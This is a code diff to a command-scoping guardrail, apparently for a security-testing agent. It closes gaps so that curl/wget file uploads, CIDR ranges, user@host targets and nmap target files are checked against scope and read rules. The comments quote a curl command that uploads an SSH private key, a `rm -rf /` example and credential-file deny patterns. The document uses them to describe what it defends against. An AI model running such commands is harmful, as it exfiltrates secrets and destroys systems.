@@ -36,6 +36,14 @@ OUTPUT_FLAG_COMMANDS = {
 	"wget": frozenset({"-O", "--output-document"}),
 }
 
+# Network-upload tools that can READ a local file as the request body via a
+# convention that does NOT look like a positional path — curl's `@file` / `field=@file`
+# (used by -d/--data*/-F) and wget's `--post-file`. Left unhandled these escape the
+# read rules entirely, so `curl --data-binary @/root/.ssh/id_rsa http://<in-scope>/`
+# silently exfiltrates a key with no read-deny/ask. The referenced file is treated as
+# a read so the read rules (`~/.ssh/*`, `/etc/shadow`, …) fire.
+INPUT_FILE_COMMANDS = frozenset({"curl", "wget"})
+
 # Exec-wrappers run a different inner command (`timeout 60 rm -rf /`) — peel the
 # wrapper and check the INNER command, not the allow-listed wrapper name.
 EXEC_WRAPPERS = frozenset({
@@ -234,6 +242,12 @@ def _is_file_path(value: str) -> bool:
 	return False
 
 
+_CIDR_RE = re.compile(r'^\d{1,3}(?:\.\d{1,3}){3}/\d{1,2}$')
+# nmap/masscan-style target-list file flags: the real targets live in a file we
+# can't read at guardrail time, so scope can't be confirmed → fail closed (ask).
+_TARGET_FILE_RE = re.compile(r'(?:^|\s)(?:-iL|--target-file)(?:=|\s)')
+
+
 def _is_network_target(value: str) -> bool:
 	"""Check if a value looks like a valid network target (IP, hostname, URL, CIDR).
 
@@ -311,6 +325,21 @@ def extract_command_targets(command: str) -> List[str]:
 		# Skip args that are part of detected file paths
 		if any(arg in p for p in paths):
 			return
+		# CIDR ranges (e.g. 10.0.0.0/8) are targets by definition — they don't resolve
+		# via DNS and classify_target may not flag them, so handle explicitly. Dropping
+		# them silently would let `nmap 10.0.0.0/8` scan an un-scoped range unchecked.
+		if _CIDR_RE.match(arg):
+			_add_target(arg)
+			return
+		# ssh/scp/rsync-style `user@host` (and `user@host:/path`) — the host is the
+		# target; strip the user@ and any remote-path suffix so `ssh root@10.0.0.9` and
+		# `scp f admin@10.0.0.9:/tmp/` are scoped on the host instead of dropped whole.
+		if '@' in arg and '://' not in arg:
+			host_candidate = arg.rsplit('@', 1)[1]
+			if ':' in host_candidate and '/' in host_candidate.split(':', 1)[1]:
+				host_candidate = host_candidate.split(':', 1)[0]
+			if _is_network_target(host_candidate):
+				arg = host_candidate
 		# Check if it's a network target (IP, host, host:port)
 		if _is_network_target(arg):
 			# For hosts (not IPs), verify DNS resolution
@@ -344,6 +373,13 @@ def extract_command_targets(command: str) -> List[str]:
 			host = match.group()
 			if host not in cmd_names and host not in seen and _resolves(host):
 				_add_target(host)
+
+	# Target-list files (nmap/masscan `-iL`, `--target-file`) hide the real targets in
+	# a file we can't read here, so their scope can't be confirmed. Surface a sentinel
+	# target with no allow rule so the scope check fails closed (asks) instead of
+	# allowing the scan because extraction found nothing.
+	if _TARGET_FILE_RE.search(command):
+		_add_target("<unverified targets from -iL file>")
 
 	return targets
 
@@ -576,12 +612,29 @@ def detect_paths_with_access(command: str) -> List[Tuple[str, str]]:
 		base_access = "write" if cmd_class == "write" else "read"
 
 		# Output-flag destinations are writes (curl -o/wget -O), not reads.
-		write_flags = OUTPUT_FLAG_COMMANDS.get(cmd_name.rsplit('/', 1)[-1], frozenset())
+		cmd_base = cmd_name.rsplit('/', 1)[-1]
+		write_flags = OUTPUT_FLAG_COMMANDS.get(cmd_base, frozenset())
+		reads_input_files = cmd_base in INPUT_FILE_COMMANDS
 
 		sub_args = args[1:]
 		i = 0
 		while i < len(sub_args):
 			arg = sub_args[i]
+			# curl/wget file-body reads: `@file`, `-d@file`, `field=@file`, and wget's
+			# `--post-file[=]file`. Take the path after the last '@' (skip URLs, whose
+			# own `user@host` also contains '@'), validated as a real path.
+			if reads_input_files:
+				cand = None
+				if '@' in arg and '://' not in arg:
+					cand = arg.rsplit('@', 1)[1]
+				elif arg.split('=', 1)[0] == '--post-file':
+					cand = arg.split('=', 1)[1] if '=' in arg else (sub_args[i + 1] if i + 1 < len(sub_args) else None)
+					if '=' not in arg and cand is not None:
+						i += 1
+				if cand and cand != '-' and _is_file_path(cand):
+					_add_path(cand, "read")
+					i += 1
+					continue
 			if write_flags:
 				dest = None
 				if arg in write_flags and i + 1 < len(sub_args):  # -o FILE / --output FILE
